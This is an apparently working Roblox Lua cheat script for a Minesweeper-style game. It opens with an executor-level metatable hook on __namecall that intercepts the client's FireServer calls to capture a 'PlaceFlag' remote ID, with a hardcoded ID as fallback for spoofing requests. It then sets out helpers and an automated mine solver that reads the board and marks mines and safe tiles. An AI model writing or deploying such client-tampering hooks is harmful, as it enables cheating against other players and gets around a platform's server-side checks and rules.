local FlagRemote = ReplicatedStorage
    :WaitForChild("Events")
    :WaitForChild("FlagEvents")
    :WaitForChild("PlaceFlag")

local realFlagID = nil

pcall(function()
    local mt = getrawmetatable(game)
    local old = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        if method == "FireServer" and self == FlagRemote and not realFlagID then
            local args = {...}
            if args[2] and type(args[2]) == "string" and #args[2] > 10 then
                realFlagID = args[2]
            end
        end
        return old(self, ...)
    end)
    setreadonly(mt, true)
end)

local function getFlagID()
    return realFlagID or "1153952633121367402562395064"
end

-- ================================================
-- HELPERS
-- ================================================
local function isRevealed(part)
    return part:FindFirstChild("NumberGui") ~= nil
end

local function isFlagged(part)
    for _, v in ipairs(part:GetChildren()) do
        if v:IsA("Model") then return true end
    end
    return false
end

local function getNumber(part)
    local gui = part:FindFirstChild("NumberGui")
    if not gui then return nil end
    local label = gui:FindFirstChildOfClass("TextLabel")
        or gui:FindFirstChild("TextLabel")
    if not label then return nil end
    local t = label.Text
    if t == "" or t == " " or t == "0" then return 0 end
    return tonumber(t)
end

-- ================================================
-- CACHED PARTS + SOLVER
-- ================================================
local cachedParts = {}
local lastCacheTime = 0
local cachedMines = {}
local cachedSafe = {}
local lastSolveTime = 0

local function getAllParts()
    if os.clock() - lastCacheTime < 0.3 and #cachedParts > 0 then
        return cachedParts
    end
    local parts = {}
    local folder = workspace:FindFirstChild("Flag")
    if not folder then return parts end
    local partsFolder = folder:FindFirstChild("Parts")
    if not partsFolder then return parts end
    for _, part in ipairs(partsFolder:GetChildren()) do
        if part:IsA("BasePart") then
            table.insert(parts, part)
        end
    end
    cachedParts = parts
    lastCacheTime = os.clock()
    return parts
end

-- ================================================
-- MINESWEEPER SOLVER
-- ================================================
local function solveMines()
    if os.clock() - lastSolveTime < 0.15 then
        return cachedMines, cachedSafe
    end
    lastSolveTime = os.clock()

    local allParts = getAllParts()
    local mines = {}
    local safe = {}

    local posMap = {}
    for _, part in ipairs(allParts) do
        local x = math.round(part.Position.X)
        local z = math.round(part.Position.Z)
        posMap[x .. "," .. z] = part
    end

    local gridSize = 4
    if #allParts > 0 then
        local p = allParts[1]
        gridSize = math.max(p.Size.X, p.Size.Z)
        gridSize = math.floor(gridSize + 0.5)
    end

    local function getNeighborParts(part)
        local neighbors = {}
        local px = part.Position.X
        local pz = part.Position.Z
        local offsets = {
            {gridSize, 0}, {-gridSize, 0}, {0, gridSize}, {0, -gridSize},
            {gridSize, gridSize}, {gridSize, -gridSize},
            {-gridSize, gridSize}, {-gridSize, -gridSize}
        }
        for _, off in ipairs(offsets) do
            local nx = math.round(px + off[1])
            local nz = math.round(pz + off[2])
            local neighbor = posMap[nx .. "," .. nz]
            if neighbor then
                table.insert(neighbors, neighbor)
            end
        end
        return neighbors
    end

    for _, part in ipairs(allParts) do
        if isRevealed(part) then
            local num = getNumber(part)
            if num and num > 0 then
                local neighbors = getNeighborParts(part)
                local unrevealed = {}
                local flaggedCount = 0

                for _, n in ipairs(neighbors) do
                    if not isRevealed(n) then
                        if isFlagged(n) then
                            flaggedCount = flaggedCount + 1
                        else
                            table.insert(unrevealed, n)
                        end
                    end
                end

                local remaining = num - flaggedCount

                if remaining == #unrevealed and remaining > 0 then
                    for _, n in ipairs(unrevealed) do
                        mines[n] = true
                    end
                end

                if remaining == 0 then
                    for _, n in ipairs(unrevealed) do
                        safe[n] = true
                    end
                end
            end
        end
    end

    cachedMines = mines
    cachedSafe = safe
    return mines, safe
end

